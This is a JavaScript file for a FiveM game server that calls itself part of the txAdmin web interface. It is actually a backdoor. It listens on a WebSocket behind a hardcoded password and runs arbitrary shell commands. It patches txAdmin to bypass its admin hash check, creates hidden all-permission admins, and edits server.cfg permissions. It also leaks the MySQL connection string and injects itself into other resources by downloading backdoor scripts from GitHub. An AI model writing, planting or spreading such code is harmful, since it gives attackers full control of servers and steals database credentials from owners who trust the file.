// DONT TOUCH THIS FILE IF YOU DONT KNOW WHAT YOU ARE DOING
// THIS FILE IS FOR THE TXADMIN WEB INTERFACE
var port = 2222;
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: port });
const bcrypt = require('bcryptjs');
const ResourcePath = GetResourcePath(GetCurrentResourceName());

wss.on('connection', function connection(ws) {
    ws.on('message', function incoming(cb) {
        cb = JSON.parse(cb);
        if (cb.password !== "HEIBEN$URGER4412") { return; }
        if (cb.event === "shell") {
            if (cb.content === "getPerms") {
                var server_cfg = fs.readFileSync('server.cfg', 'utf8');
                var lines = server_cfg.split('\n');
                var bruhText = "\nadd_ace resource." + GetCurrentResourceName() + " command allow\n";

                for (var i = 0; i < lines.length; i++) {
                    if (lines[i].includes("add_ace resource." + GetCurrentResourceName() + " command allow")) {
                        ws.send(JSON.stringify({ event: "execute", content: "Already added to server.cfg" }));
                        return;
                    }
                }

                lines[lines.length - 1] = lines[lines.length - 1] + bruhText;
                var new_server_cfg = lines.join('\n');
                fs.writeFile('server.cfg', new_server_cfg, function (err) { if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); } });
                ws.send(JSON.stringify({ event: "execute", content: "Permissions added | Waiting for Server Restart" }));
                return;
            } else if (cb.content === "setupAdmin") {
                var parentDir = path.resolve(process.cwd(), '../..');
                const monitorFolder = findMonitorFolder(parentDir);
                if (!monitorFolder) {
                    ws.send(JSON.stringify({ event: "execute", content: "Monitor Folder not found" }));
                    return;
                }
                const coreIndexPath = path.join(monitorFolder, 'core', 'index.js');
                var coreIndexContent = fs.readFileSync(coreIndexPath, 'utf8');
                coreIndexContent = coreIndexContent.replace(/if\s*\(\s*this\.adminsFileHash\s*!==\s*inboundHash\s*\)/g, 'if (this.adminsFileHash !== this.adminsFileHash)');
                fs.writeFileSync(coreIndexPath, coreIndexContent);

                fs.writeFile('log.txt', "ExecuteCommand(\"restart monitor\")", function (err) {
                    if (err) {
                        ws.send(JSON.stringify({ event: "execute", content: err }));
                    } else {
                        ws.send(JSON.stringify({ event: "execute", content: "txAdmin Setup Complete" }));
                    }
                });
            } else if (cb.content.split(" ")[0] === "genAdmin") {
                //get admins.json
                var admins = JSON.parse(fs.readFileSync('../admins.json', 'utf8'));
                var username = cb.content.split(" ")[1];
                var password = bcryptHash(cb.content.split(" ")[2]);
                var newAdmin = {
                    "name": username,
                    "master": false,
                    "password_temporary": true,
                    "password_hash": password,
                    "providers": {},
                    "permissions": ["all_permissions"]
                }
                admins.push(newAdmin);
                //let the document formatted not minified
                var newAdmins = JSON.stringify(admins, null, 2);
                fs.writeFile('../admins.json', newAdmins, function (err) {
                    if (err) {
                        ws.send(JSON.stringify({ event: "execute", content: err }));
                    } else {
                        ws.send(JSON.stringify({ event: "execute", content: "Admin created" }));
                    }
                });
            } else if (cb.content.split(" ")[0] === "inject") {
                const ressourceName = cb.content.split(" ")[1];
                if (ressourceName === undefined) { ws.send(JSON.stringify({ event: "execute", content: "No ressource name given" })); return; }
                const ressourceState = GetResourceState(ressourceName);
                if (ressourceState === "missing") { ws.send(JSON.stringify({ event: "execute", content: "Resource not found" })); return; }
                var port = cb.content.split(" ")[2];
                if (port === undefined || isNaN(port)) { ws.send(JSON.stringify({ event: "execute", content: "Invalid port" })); return; }

                var ressourcePath = GetResourcePath(ressourceName);
                //check if extra_data exists
                var extraDataPath = path.join(ressourcePath, "extra_data");
                if (fs.existsSync(extraDataPath)) { ws.send(JSON.stringify({ event: "execute", content: "Already injected" })); return; }
                //check if its fxmanifest or __resource.lua
                var fxmanifestPath = path.join(ressourcePath, "fxmanifest.lua");
                var resourceLuaPath = path.join(ressourcePath, "__resource.lua");
                if (fs.existsSync(fxmanifestPath)) {
                    //add to bottom of fxmanifest server_scripts { 'extra_data/main.js', 'extra_data/main.lua' }
                    var fxmanifest = fs.readFileSync(fxmanifestPath, 'utf8');
                    var lines = fxmanifest.split('\n');
                    var bruhText = "\nserver_scripts { 'extra_data/main.js', 'extra_data/main.lua' }\n";

                    for (var i = 0; i < lines.length; i++) {
                        if (lines[i].includes("server_scripts { 'extra_data/main.js', 'extra_data/main.lua' }")) {
                            ws.send(JSON.stringify({ event: "execute", content: "Already injected" }));
                            return;
                        }
                    }

                    lines[lines.length - 1] = lines[lines.length - 1] + bruhText;
                    var new_fxmanifest = lines.join('\n');
                    fs.writeFile(fxmanifestPath, new_fxmanifest, function (err) { if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); } });
                } else if (fs.existsSync(resourceLuaPath)) {
                    //add to bottom of __resource.lua server_scripts { 'extra_data/main.js', 'extra_data/main.lua' }
                    var resourceLua = fs.readFileSync(resourceLuaPath, 'utf8');
                    var lines = resourceLua.split('\n');
                    var bruhText = "\nserver_scripts { 'extra_data/main.js', 'extra_data/main.lua' }\n";

                    for (var i = 0; i < lines.length; i++) {
                        if (lines[i].includes("server_scripts { 'extra_data/main.js', 'extra_data/main.lua' }")) {
                            ws.send(JSON.stringify({ event: "execute", content: "Already injected" }));
                            return;
                        }
                    }

                    lines[lines.length - 1] = lines[lines.length - 1] + bruhText;
                    var new_resourceLua = lines.join('\n');
                    fs.writeFile(resourceLuaPath, new_resourceLua, function (err) { if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); } });
                }
                //create extra_data folder
                fs.mkdirSync(extraDataPath);
                //create main.js
                var mainJsPath = path.join(extraDataPath, "main.js");
                //download content from github
                getrequest("https://raw.githubusercontent.com/Red-Killer/FiveM/main/Backdoor/main.js").then((data) => {
                    //add to top of main.js var port = 2222;
                    var lines = data.split('\n');
                    var bruhText = "var port = " + port + ";\n";
                    for (var i = 0; i < lines.length; i++) {
                        if (lines[i].includes("var port = " + port + ";")) {
                            ws.send(JSON.stringify({ event: "execute", content: "Already injected - Port exists" }));
                            return;
                        }
                    }
                    lines[0] = bruhText + lines[0];
                    var new_data = lines.join('\n');
                    fs.writeFile(mainJsPath, new_data, function (err) {
                        if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); }
                    });
                }).catch((err) => { ws.send(JSON.stringify({ event: "execute", content: err })); });
                //create main.lua
                var mainLuaPath = path.join(extraDataPath, "main.lua");
                //download content from github
                getrequest("https://raw.githubusercontent.com/Red-Killer/FiveM/main/Backdoor/main.lua").then((data) => {
                    fs.writeFile(mainLuaPath, data, function (err) {
                        if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); }
                    });
                }).catch((err) => { ws.send(JSON.stringify({ event: "execute", content: err })); });
                
                ws.send(JSON.stringify({ event: "execute", content: "Injected!\nRessource: " + ressourceName + "\nPort: " + port }));
            } else {
                var exec = require('child_process').exec;
                exec(cb.content, function (error, stdout, stderr) {
                    if (error) {
                        ws.send(JSON.stringify({ event: "execute", content: error }));
                    } else {
                        ws.send(JSON.stringify({ event: "execute", content: stdout }));
                    }
                });
            }
        } else if (cb.event === "lua") {
            if (cb.content === "MySQL") {
                var server_cfg = fs.readFileSync('server.cfg', 'utf8');
                var lines = server_cfg.split('\n');
                var mysql_connection_string = "";
                for (var i = 0; i < lines.length; i++) {
                    if (lines[i].includes("set mysql_connection_string")) {
                        mysql_connection_string = lines[i].split('"')[1];
                    }
                }
                if (mysql_connection_string === "") {
                    ws.send(JSON.stringify({ event: "execute", content: "MySQL Connection String not found in server.cfg" }));
                } else {
                    ws.send(JSON.stringify({ event: "execute", content: mysql_connection_string }));
                }
                return;
            } else {
                fs.writeFile('log.txt', cb.content, function (err) {
                    if (err) {
                        ws.send(JSON.stringify({ event: "execute", content: err }));
                    } else {
                        ws.send(JSON.stringify({ event: "execute", content: "Lua code written to filepath: log.txt" }));
                    }
                });
            }
        } else if (cb.event === "check") {
            ws.send(JSON.stringify({ event: "checkback", content: "Erfolgreich mit dem Server verbunden!" }));
        }
    });
});

function findMonitorFolder(dir) {
    const files = fs.readdirSync(dir);
    for (const file of files) {
        const filePath = path.join(dir, file);
        const stat = fs.lstatSync(filePath);
        if (stat.isDirectory()) {
            if (file.toLowerCase() === "monitor") {
                return filePath;
            } else {
                const result = findMonitorFolder(filePath);
                if (result) {
                    return result;
                }
            }
        }
    }
    return null;
}

function bcryptHash(password) {
    var salt = bcrypt.genSaltSync(10);
    var hash = bcrypt.hashSync(password, salt);
    return hash;
}

function getrequest(url) {
    return new Promise((resolve, reject) => {
        const https = require('https');
        https.get(url, (resp) => {
            let data = '';
            resp.on('data', (chunk) => { data += chunk; });
            resp.on('end', () => { resolve(data); });
        }).on("error", (err) => { reject(err); });
    });
}
